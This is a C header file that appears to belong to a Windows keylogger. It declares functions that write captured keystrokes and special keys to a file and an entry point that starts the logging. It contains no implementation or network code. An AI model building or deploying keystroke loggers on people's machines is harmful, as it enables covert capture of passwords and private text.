#include <stdio.h>

#ifndef WIN_KEYLOG_H
#define WIN_KEYLOG_H

void WriteIntoFile(char data, const char* file);
void WriteSpecialKeyIntoFile(char *data, const char* file);
char* SpecialKeyToReadable(int data);
int isSpecialKey(char data);
void windows_keylog(const char* file);

#endif // WIN_KEYLOG_H